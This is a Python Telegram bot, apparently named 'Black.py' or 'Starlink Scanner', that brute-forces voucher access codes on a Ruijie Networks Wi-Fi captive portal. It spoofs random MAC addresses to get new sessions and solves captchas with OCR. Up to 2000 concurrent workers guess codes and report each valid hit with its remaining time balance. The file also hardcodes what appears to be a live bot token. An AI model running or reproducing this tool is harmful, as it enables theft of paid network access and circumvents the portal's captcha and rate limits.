#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Black.py — Direct connection (no proxy) + hardcoded token
"""

import os
import re
import time
import random
import asyncio
from urllib.parse import urlparse, parse_qs

import aiohttp

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters)

import ddddocr

# ─────────────────────────── CONFIG ───────────────────────────

# ⭐ Token ဒီမှာ ထည့်ထားတယ်
BOT_TOKEN = "8889706834:AAEtS3MMCaYY9iAxZkZH2Geh48FC4iPfIEE"

PORTAL_URL_PATH = "portal_url_"

ADMIN_IDS = [6537847588]

DEFAULT_WORKERS = 1000
MAX_WORKERS     = 2000
MAX_CODES_PER_SESSION = 100000
MAX_CODES_PER_SID = 200
TIMEOUT_SEC = 20

user_scanners = {}
_ocr_instance = None


# ─────────────────────────── OCR ───────────────────────────

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


def ocr_image_bytes_fast(image_bytes):
    ocr = get_ocr_instance()
    return ocr.classification(image_bytes).strip().upper()


# ─────────────────────────── USER DATA ───────────────────────────

def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        p_file = PORTAL_URL_PATH + str(user_id) + ".txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None
        user_scanners[user_id] = {
            "mode": "num6",
            "char_set": "012345678",
            "code_len": 6,
            "start_digit": None,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None,
            "stats": {"tried": 0, "hits": 0, "expired": 0, "limits": 0,
                      "start_time": time.time()},
            "valid_codes": [],
            "tried_codes": set(),
            "recent_logs": [],
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": None,
            "worker_count": DEFAULT_WORKERS,
        }
    return user_scanners[user_id]


# ─────────────────────────── HELPERS ───────────────────────────

def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    else:
        sep = "&" if "?" in url else "?"
        return url + sep + "mac=" + new_mac


API_BASE = "https://portal-as.ruijienetworks.com"
LOGIN_URL = API_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = API_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = API_BASE + "/api/auth/captcha/verify"
BALANCE_URL = API_BASE + "/api/auth/balance/getBalance/"


# ─────────────────────────── SID ───────────────────────────

async def get_sid_from_gateway(session, portal_url, user_id):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                             "AppleWebKit/537.36 (KHTML, like Gecko) "
                             "Chrome/120.0.0.0 Safari/537.36"}
    try:
        parsed = parse_qs(urlparse(portal_url).query)
        sid = parsed.get("sessionId") or parsed.get("sid")
        if sid:
            return sid[0]

        mac = generate_random_mac()
        spoofed_url = replace_mac(portal_url, mac)

        async with session.get(spoofed_url, headers=headers,
                               timeout=TIMEOUT_SEC, ssl=False,
                               allow_redirects=True) as r2:
            body = await r2.text()
            final_url = str(r2.url)

            m = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final_url)
            if m:
                return m.group(1)

            m2 = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if m2:
                async with session.get(m2.group(1), headers=headers,
                                       timeout=TIMEOUT_SEC, ssl=False,
                                       allow_redirects=True) as r3:
                    final3 = str(r3.url)
                    m3 = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final3)
                    if m3:
                        return m3.group(1)

            m4 = re.search(r'sessionId["\']?\s*[:=]\s*["\']([a-zA-Z0-9]+)', body)
            if m4:
                return m4.group(1)

        return None
    except Exception as e:
        print(f"[SID] Error: {type(e).__name__}: {e}")
        return None


# ─────────────────────────── BALANCE ───────────────────────────

async def fetch_balance(active_token):
    url = BALANCE_URL + active_token + "?lang=en_US"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "referer": API_BASE + "/download/static/maccauth/src/balance.html?sessionId=" + active_token,
        "user-agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 "
                      "Chrome/148.0.0.0 Mobile Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, ssl=False,
                                   timeout=TIMEOUT_SEC) as resp:
                data = await resp.json()
        inner = data.get("result", data) if isinstance(data, dict) else {}
        profile_name = inner.get("profileName") or "N/A"
        raw_total = inner.get("totalMinutes") or 0
        try:
            total_minutes = int(raw_total)
        except Exception:
            total_minutes = 0
        hours, minutes = divmod(total_minutes, 60)
        return f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
    except Exception:
        return "🃏: N/A, ⏰: Error"


async def check_balance(active_token, code, user_id):
    ud = get_user_data(user_id)
    balance_str = await fetch_balance(active_token)
    for item in ud["valid_codes"]:
        if isinstance(item, dict) and item.get("code") == code:
            item["balance_str"] = balance_str
    return balance_str


# ─────────────────────────── CODE CHECK ───────────────────────────

async def check_single_access_code(session, code, current_session_id, user_id):
    ud = get_user_data(user_id)
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": API_BASE,
        "referer": API_BASE + f"/download/static/maccauth/src/index.html?sessionId={current_session_id}",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                      "Chrome/139.0.0.0 Mobile Safari/537.36",
    }

    auth_code = None
    for _ in range(5):
        captcha_url = CAPTCHA_IMAGE_URL + "?sessionId=" + str(current_session_id) + "&_t=" + str(int(time.time()*1000))
        try:
            async with session.get(captcha_url, headers=headers, ssl=False,
                                   timeout=TIMEOUT_SEC) as response:
                image_content = await response.read()
                auth_code = await asyncio.to_thread(ocr_image_bytes_fast, image_content)
                if auth_code and len(auth_code) >= 3:
                    break
        except Exception as e:
            print(f"[Captcha] Error: {e}")
            auth_code = None
    if not auth_code:
        return "failed"

    try:
        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        async with session.post(CAPTCHA_VERIFY_URL, json=v_payload, headers=headers,
                                ssl=False, timeout=TIMEOUT_SEC) as v_resp:
            v_data = await v_resp.json()
            if not (isinstance(v_data, dict) and v_data.get("success")):
                return "failed"

        l_payload = {"accessCode": code, "sessionId": current_session_id,
                     "apiVersion": 1, "authCode": auth_code}
        async with session.post(LOGIN_URL, json=l_payload, headers=headers,
                                ssl=False, timeout=TIMEOUT_SEC) as l_resp:
            l_text = await l_resp.text()
            low = l_text.lower()

            if "expired" in low:
                ud["stats"]["expired"] += 1
                return "expired"
            if "request limited" in low:
                ud["stats"]["limits"] += 1
                await asyncio.sleep(3)
                return "limit"
            if '"success":true' in low or "logonurl" in low:
                token_match = re.search(r"token=([^&\s\"\'<>]+)", l_text)
                active_token = token_match.group(1) if token_match else None
                ud["stats"]["hits"] += 1
                ud["valid_codes"].append({
                    "code": code,
                    "active_token": active_token,
                    "balance_str": None,
                })
                ud["recent_logs"].append(f"✅ HIT: {code}")
                ud["dash_update_event"].set()
                if active_token:
                    asyncio.ensure_future(check_balance(active_token, code, user_id))
                return "hit"
            return "failed"
    except asyncio.CancelledError:
        raise
    except Exception as e:
        print(f"[Check] Error: {type(e).__name__}: {e}")
        return "failed"


# ─────────────────────────── WORKER ───────────────────────────

async def worker(worker_id, user_id):
    ud = get_user_data(user_id)

    while not ud["stop_event"].is_set():
        try:
            async with aiohttp.ClientSession() as session:
                current_session_id = await get_sid_from_gateway(
                    session, ud["portal_url"], user_id)

                if not current_session_id:
                    await asyncio.sleep(1)
                    continue

                codes_checked_this_sid = 0

                while (not ud["stop_event"].is_set()
                       and codes_checked_this_sid < MAX_CODES_PER_SID):
                    if ud["mode"] == "custom" and ud.get("start_digit"):
                        body_chars = [ud["start_digit"]] + \
                            random.choices(ud["char_set"], k=ud["code_len"] - 1)
                        code = "".join(body_chars)
                    else:
                        code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))

                    if code in ud["tried_codes"]:
                        continue
                    ud["tried_codes"].add(code)
                    ud["CURRENT_CODE"] = code
                    ud["stats"]["tried"] += 1
                    codes_checked_this_sid += 1

                    result = await check_single_access_code(
                        session, code, current_session_id, user_id)

                    if result == "hit":
                        print(f"[Worker {worker_id}] 🎉 HIT! {code}")

                    await asyncio.sleep(0.2)

        except asyncio.CancelledError:
            return
        except Exception as e:
            print(f"[Worker {worker_id}] Error: {type(e).__name__}: {e}")
            await asyncio.sleep(1)


# ─────────────────────────── DASHBOARD ───────────────────────────

async def live_dashboard_updater(context, user_id):
    ud = get_user_data(user_id)
    while not ud["stop_event"].is_set():
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = stats["tried"] / (elapsed / 60) if elapsed > 0 else 0.0
            hit_block = "None yet"
            if ud["valid_codes"]:
                hit_list = []
                for item in ud["valid_codes"][-10:]:
                    if isinstance(item, dict):
                        c = item.get("code", "?")
                        balance = item.get("balance_str") or "..."
                        hit_list.append(f"🔥 {c} {balance}")
                hit_block = "\n".join(hit_list)
            text = (
                "⚡ Scanner Running ⚡\n"
                "Thank for using By Telegram @MgBlack400\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🎸 Tried: {stats['tried']:,}\n"
                f"🎯 Current Code: {ud['CURRENT_CODE']}\n"
                f"🔥 Hits: {stats['hits']}\n"
                f"⚔️ Expired: {stats['expired']}\n"
                f"⚠️ Limits: {stats['limits']}\n"
                f"⚡ Speed: {speed_cpm:.1f} c/m\n"
                f"⚙️ Workers: {ud.get('worker_count', DEFAULT_WORKERS)}\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "🔥 **Hit Codes**:\n"
                f"{hit_block}\n"
                "━━━━━━━━━━━━━━━━━━\n"
            )
            keyboard = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")]])
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=text,
                reply_markup=keyboard)
        except asyncio.CancelledError:
            return
        except Exception as e:
            print(f"[Dashboard] Error: {e}")
        try:
            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=10.0)
        except asyncio.TimeoutError:
            pass
        ud["dash_update_event"].clear()


# ─────────────────────────── SCANNER ───────────────────────────

async def run_user_scanner(context, user_id):
    ud = get_user_data(user_id)
    portal_url = ud["portal_url"]
    if not portal_url:
        return

    ud["stats"]["start_time"] = time.time()
    tasks = []
    worker_count = max(1, min(MAX_WORKERS,
                              int(ud.get("worker_count", DEFAULT_WORKERS))))

    dash_task = asyncio.ensure_future(live_dashboard_updater(context, user_id))
    for i in range(worker_count):
        t = asyncio.ensure_future(worker(i, user_id))
        tasks.append(t)

    ud["task"] = dash_task

    try:
        while not ud["stop_event"].is_set():
            if all(t.done() for t in tasks):
                break
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        ud["stop_event"].set()
    finally:
        ud["stop_event"].set()
        for t in tasks:
            if not t.done():
                t.cancel()
        if dash_task and not dash_task.done():
            dash_task.cancel()
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = stats["tried"] / (elapsed / 60) if elapsed > 0 else 0.0
            hit_block = "None"
            if ud["valid_codes"]:
                hit_list = []
                for item in ud["valid_codes"]:
                    if isinstance(item, dict):
                        c = item.get("code", "?")
                        balance = item.get("balance_str") or "..."
                        hit_list.append(f"🔥 {c} {balance}")
                hit_block = "\n".join(hit_list)
            final_text = (
                "🛑 Scanner Stopped/Finished\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🔓 Total Tried: {stats['tried']:,}\n"
                f"🟢 Hits: {stats['hits']}\n"
                f"⚡ Final Speed: {speed_cpm:.1f} c/m\n"
                f"⚙️ Workers: {ud.get('worker_count', DEFAULT_WORKERS)}\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "📋 **All Hit Codes**:\n"
                f"{hit_block}\n"
                "━━━━━━━━━━━━━━━━━━\n"
            )
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=final_text)
        except Exception:
            pass
        ud["task"] = None


# ─────────────────────────── UI ───────────────────────────

def get_main_menu_markup(ud=None):
    workers_label = f"⚙️ Set Workers ({ud.get('worker_count', DEFAULT_WORKERS)})" \
        if ud else "⚙️ Set Workers"
    keyboard = [
        [InlineKeyboardButton("🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu")],
        [InlineKeyboardButton(workers_label, callback_data="btn_set_workers")],
        [InlineKeyboardButton("🚀 Start Scanner", callback_data="btn_start_scanner")],
    ]
    return InlineKeyboardMarkup(keyboard)


def main_panel(ud):
    return (
        "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"⚙️ Current Mode: `{ud['mode']}`\n"
        f"⚙️ Workers: `{ud.get('worker_count', DEFAULT_WORKERS)}`\n"
        f"🔌 Connection: `Direct`\n"
    )


def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


@admin_only
async def start(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    await update.message.reply_text(main_panel(ud),
                                    reply_markup=get_main_menu_markup(ud),
                                    parse_mode=ParseMode.MARKDOWN)


@admin_only
async def handle_callbacks(update, context):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_update_portal":
        ud["state"] = "waiting_for_portal_url"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.reply_text("🌐 **Portal URL ကိုဖြည့်ပါ**")
        return

    elif data == "btn_mode_menu":
        keyboard = [
            [InlineKeyboardButton("Number 6", callback_data="set_mode_num6"),
             InlineKeyboardButton("Number 7", callback_data="set_mode_num7"),
             InlineKeyboardButton("Number 8", callback_data="set_mode_num8"),
             InlineKeyboardButton("Number 9", callback_data="set_mode_num9")],
            [InlineKeyboardButton("Abc 6", callback_data="set_mode_abc6"),
             InlineKeyboardButton("Mix 6", callback_data="set_mode_mix6"),
             InlineKeyboardButton("Mix 7", callback_data="set_mode_mix7"),
             InlineKeyboardButton("Mix 8", callback_data="set_mode_mix8"),
             InlineKeyboardButton("Mix 9", callback_data="set_mode_mix9")],
            [InlineKeyboardButton("Custom Start", callback_data="set_mode_custom")],
            [InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")],
        ]
        await query.message.reply_text("⚙️ **Choose Scanner Mode**",
                                       reply_markup=InlineKeyboardMarkup(keyboard))
        return

    elif data == "btn_set_workers":
        ud["state"] = "waiting_for_workers"
        ud["menu_msg_id"] = query.message.message_id
        await query.message.reply_text(
            f"⚙️ **Worker အရေအတွက် ထည့်ပါ**\n\n"
            f"လက်ရှိ: `{ud.get('worker_count', DEFAULT_WORKERS)}`\n"
            f"Range: `1 – {MAX_WORKERS}`")
        return

    elif data == "btn_start_scanner":
        if not ud["portal_url"]:
            await query.message.reply_text("❌ Portal URL မထည့်ရသေးပါ။")
            return
        ud["state"] = None
        msg = await query.message.reply_text(
            f"🔄 Initializing with {ud.get('worker_count', DEFAULT_WORKERS)} workers...")
        ud["dash_msg_id"] = msg.message_id
        ud["stop_event"].clear()
        ud["stats"] = {"tried": 0, "hits": 0, "expired": 0, "limits": 0,
                       "start_time": time.time()}
        ud["valid_codes"] = []
        ud["tried_codes"] = set()
        task = asyncio.ensure_future(run_user_scanner(context, user_id))
        ud["task"] = task
        return

    elif data == "btn_back_main":
        await query.message.reply_text(main_panel(ud),
                                       reply_markup=get_main_menu_markup(ud),
                                       parse_mode=ParseMode.MARKDOWN)
        return

    elif data == "stop_scan":
        ud["stop_event"].set()
        return

    elif data.startswith("set_mode_"):
        mode = data[len("set_mode_"):]
        mode_configs = {
            "num6": ("num6", "012345678", 6),
            "num7": ("num7", "012345678", 7),
            "num8": ("num8", "012345678", 8),
            "num9": ("num9", "012345678", 9),
            "abc6": ("abc6", "abcdefghijkmnpqrstuvwxyz", 6),
            "mix6": ("mix6", "2345678abcdefghijkmnpqrstuvwxyz", 6),
            "mix7": ("mix7", "2345678abcdefghijkmnpqrstuvwxyz", 7),
            "mix8": ("mix8", "2345678abcdefghijkmnpqrstuvwxyz", 8),
            "mix9": ("mix9", "2345678abcdefghijkmnpqrstuvwxyz", 9),
        }
        if mode == "custom":
            ud["mode"] = "custom"
            ud["state"] = "waiting_for_digit"
            ud["menu_msg_id"] = query.message.message_id
            await query.message.reply_text("🔢 **Start Digit**\nနံပါတ်တစ်လုံး ထည့်ပါ")
            return
        if mode in mode_configs:
            ud["mode"], ud["char_set"], ud["code_len"] = mode_configs[mode]
            ud["state"] = None
            await query.message.reply_text(main_panel(ud),
                                           reply_markup=get_main_menu_markup(ud),
                                           parse_mode=ParseMode.MARKDOWN)
        return


@admin_only
async def handle_text(update, context):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    text = update.message.text.strip()

    if ud["state"] == "waiting_for_portal_url":
        if text.startswith("http://") or text.startswith("https://"):
            ud["portal_url"] = text
            p_file = PORTAL_URL_PATH + str(user_id) + ".txt"
            with open(p_file, "w") as f:
                f.write(text)
            ud["state"] = None
            await update.message.reply_text(
                "✅ Portal URL သိမ်းပြီးပါပြီ\n\n" + main_panel(ud),
                reply_markup=get_main_menu_markup(ud),
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Invalid URL!")
        return

    elif ud["state"] == "waiting_for_workers":
        if text.isdigit():
            n = int(text)
            if 1 <= n <= MAX_WORKERS:
                ud["worker_count"] = n
                ud["state"] = None
                await update.message.reply_text(
                    f"✅ Workers = `{n}` သိမ်းပြီးပါပြီ\n\n" + main_panel(ud),
                    reply_markup=get_main_menu_markup(ud),
                    parse_mode=ParseMode.MARKDOWN)
            else:
                await update.message.reply_text(
                    f"❌ 1 – {MAX_WORKERS} အတွင်း ထည့်ပါ")
        else:
            await update.message.reply_text("❌ နံပါတ်ပဲ ထည့်ပါ")
        return

    elif ud["state"] == "waiting_for_digit":
        digit = text.strip()
        if digit.isdigit() and len(digit) == 1:
            ud["start_digit"] = digit
            ud["state"] = None
            await update.message.reply_text(
                f"✅ Custom Start Digit = `{digit}`\n\n" + main_panel(ud),
                reply_markup=get_main_menu_markup(ud),
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Single digit only!")
        return


# ─────────────────────────── MAIN ───────────────────────────

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("Bot is running (DIRECT connection — no proxy)...")
    app.run_polling()


if __name__ == "__main__":
    main()